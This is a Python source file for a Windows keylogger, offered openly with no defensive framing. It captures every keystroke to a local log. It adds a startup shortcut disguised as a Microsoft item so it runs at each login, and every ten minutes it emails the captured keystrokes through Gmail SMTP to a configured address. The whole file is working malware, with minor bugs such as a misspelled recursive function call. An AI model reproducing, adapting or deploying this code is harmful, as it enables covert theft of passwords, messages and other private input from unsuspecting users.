from pynput.keyboard import Key,Listener
import winshell
import sys
import os
import urllib.request
import smtplib
import time

global start_time,yourgmail,yourgmailpass,sendto,interval,otpravka

#########Settings########
yourgmail = ""
yourgmailpass = ""
sendto = ""
interval = 10
otpravka = 600
start_time = time.time()
#########################


def connection_to_the_Internet():
    """This function check is computer have a connect to the internet"""
    try:
        urllib.request.urlopen('http://google.com')
    except:
        time.sleep(interval)
        Connection_to_the_Internet()


def check_file():
    """This function will check is file exist."""
    try:
        file = open('Log.txt','a')
    except IOError:
        file = open('Log.txt','w')
    finally:
        file.close


def addStartup():
    """This will add the file to the startup registry key."""
    startFile = os.path.abspath(sys.argv[0])
    startup = winshell.startup()
    winshell.CreateShortcut(
          Path = os.path.join(startup,"Microsoft Corporative.lnk"),
          Target = startFile,
          Icon = (startFile,0),
          Description = "Microsoft Corporation",
          StartIn = os.path.abspath(None)
          )


def mail_it(data):
    """Sending pressed keys to the email."""
    data = 'Text:\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()


def on_press(key):
    global start_time
    """Check pressing of button and write the name of it."""
    try:
        file = open('Log.txt','a')
        if(str(key) == 'Key.ctrl_l'):
              file.write(' CTRL_L ')
        elif(str(key) == 'Key.alt_l'):
              file.write(' ALT_L ')
        elif(str(key) == 'Key.shift'):
              file.write(' SHIFT_L ')
        elif(str(key) == 'Key.caps_lock'):
              file.write(' CAPS_LOCK ')
        elif(str(key) == 'Key.tab'):
              file.write(' TAB ')
        elif(str(key) == 'Key.space'):
              file.write(' SPACE ')
        elif(str(key) == 'Key.alt_r'):
              file.write(' ALT_R ')
        elif(str(key) == 'Key.ctrl_r'):
              file.write(' CTRL_R ')
        elif(str(key) == 'Key.shift_r'):
              file.write(' SHIFT_R ')
        elif(str(key) == 'Key.enter'):
              file.write('ENTER')
        elif(str(key) == 'Key.backspace'):
              file.write(' BACKSPACE ')
        elif(str(key) == 'Key.esc'):
              file.write(' ESC ')
        else:
              file.write(str(key))
    except AttributeError:
        file.write(key.name)
    finally:
        file.close
        if int(time.time() - start_time) >= int(otpravka):
            f = open('Log.txt','r')
            new_data = f.read()
            f.close()
            mail_it(new_data)
            start_time = time.time()
            f = open('Log.txt','w')
            f.close
              
          
def start():
    """Main function"""
    addStartup()
    check_file()
    connection_to_the_Internet()
    lis = Listener(on_press = on_press)
    lis.start()
    lis.join()


start()
